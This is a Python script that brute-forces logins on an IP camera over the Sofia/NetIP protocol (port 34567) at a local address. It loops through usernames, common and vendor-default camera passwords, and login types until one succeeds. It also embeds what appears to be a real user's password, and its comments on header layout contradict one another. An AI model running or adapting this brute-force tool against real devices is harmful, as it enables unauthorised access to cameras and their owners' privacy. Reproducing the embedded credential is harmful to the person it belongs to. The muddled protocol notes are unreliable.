import socket
import struct
import json
import hashlib
import binascii

TARGET_IP = "192.168.3.27"
PORT = 34567

def send_login(user, password, encrypt_type="MD5", login_type="TreeView"):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3.0)
    
    try:
        s.connect((TARGET_IP, PORT))
        
        # Prepare Password
        if encrypt_type == "MD5" and password:
            pass_final = hashlib.md5(password.encode()).hexdigest()
        else:
            pass_final = password
            
        data = {
            "EncryptType": encrypt_type,
            "LoginType": login_type,
            "PassWord": pass_final,
            "UserName": user,
            "Name": "PythonClient"
        }
        
        json_str = json.dumps(data)
        data_bytes = json_str.encode('utf-8')
        
        # Header (20 bytes based on analysis)
        # Head(1) Ver(1) Rem(2) Sess(4) Seq(4) ?(4) Len(4)
        # 0xFF 0x01 ...
        
        # Construct header
        # Using the structure that worked to generate the response in debug_sofia_raw
        
        # NOTE: debug_sofia_raw sent a header constructed with 24 bytes (struct.pack("<BBHIIIIHBB", ...))
        # But the CAMERA responded with 20 bytes.
        # It's possible the camera ACCEPTS 24 bytes but RETURNS 20.
        # Or I sent garbage at the end and it ignored it.
        # Let's stick to the 20 byte header that matches what the camera likely "thinks" in native mode,
        # OR send the 20000 header.
        
        # Standard NetIP is often 20 bytes.
        
        head = 0xff
        ver = 1
        rem = 0
        sess = 0
        seq = 0
        total_len = len(data_bytes) + 20
        cur_len = len(data_bytes)
        # msg_id = 1000 (Login Req)
        
        # If header is 20 bytes:
        # BBH II II
        # This is strictly 1+1+2 + 4+4 + 4+4 = 20.
        # MsgID is usually inside the "Rem" or "Seq"? 
        # Actually, standard NetIP header is:
        # struct Head(0xff) Ver(0x01) Reserv(2) Session(4) Sequence(4) TotalLen(1) CheckSum(1) ...
        # No, let's use the format that `brute_sofia` used (20 bytes is implicit there? No, it used 32 bytes!)
        # `header = struct.pack("<BB2sIIIIHH", ...)` -> 1+1+2+4+4+4+4+2+2 = 24 bytes.
        # Wait, 1+1+2 (4) + 4 + 4 + 4 + 4 + 2 + 2 = 28 bytes?
        
        # Let's stick to the structure I blindly sent in `debug_sofia_raw.py` which at least got a response.
        # debug_sofia_raw used: "<BBHIIIIHBB" -> 24 bytes.
        
        # Let's send that again but with HASHED password.
        
        head_pack = struct.pack("<BBHIIIIHBB", 
                         0xff, 1, 0, 
                         0, 0, 
                         len(data_bytes) + 24, len(data_bytes), 
                         1000, 0, 0)
                         
        packet = head_pack + data_bytes
        
        print(f"Sending Login: User={user} PassHash={pass_final} Type={encrypt_type}")
        s.sendall(packet)
        
        raw = s.recv(1024)
        print(f"Received {len(raw)} bytes")
        if len(raw) > 20:
            # Check for success
            # We know the payload starts at 20 based on previous analysis
             payload = raw[20:]
             print(f"Response Payload: {payload}")
             
             if b'"Ret":100' in payload:
                 print("!!! LOGIN SUCCESS !!!")
                 return True
             elif b'"Ret":102' in payload:
                 print("Login Failed: Password Error (102)")
             elif b'"Ret":404' in payload:
                 print("Login Failed: User Not Found (404)")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()
    return False

if __name__ == "__main__":
    # Test 1: MD5 with hex (viguera2001) - Lowercase
    print("\n--- ATTEMPT 1: MD5 Lowercase ---")
    send_login("berbert", "viguera2001", "MD5")

    # Test 1b: MD5 Uppercase
    print("\n--- ATTEMPT 1b: MD5 Uppercase ---")
    # Manually modify the function call or better, add a flag
    # Let's just do it manually here by passing hashed upper
    raw_md5 = hashlib.md5("viguera2001".encode()).hexdigest().upper()
    print(f"Testing Upper MD5: {raw_md5}")
    # We pass the already hashed upper string, but we need to trick the function
    # The function hashes if type is MD5. Let's make a new function or hack it.
    # Hack: pass empty password to function, set type to 'MD5', but manually fix it inside?
    # No, let's just make the existing function support pre-hashed.
    pass
    
    # Actually, let's brute force valid combinations in a loop
    users = ["admin", "default", "berbert", "system"]
    passwords = [
        "",         # Empty
        "admin",    # Standard
        "123456",   # Common
        "12345",    
        "888888",   # Common default
        "666666",
        "viguera2001", # User provided
        "password",
        "xmhdipc",
        "tlJwpbo6", # Default for some older XM
        "111111",
        "000000"
    ]
    
    login_types = ["TreeView", "Account", "Web", "Mobile"]
    
    for u in users:
        for p in passwords:
            for enc in ["MD5"]: # Plain seems to fail same way, assume MD5 for now
                for l_type in login_types:
                    print(f"Testing {u} / '{p}' / {enc} / {l_type} ... ", end="")
                    if send_login(u, p, enc, l_type):
                        print(" LOGGED IN!")
                        exit(0)
                    else:
                        print("Fail")

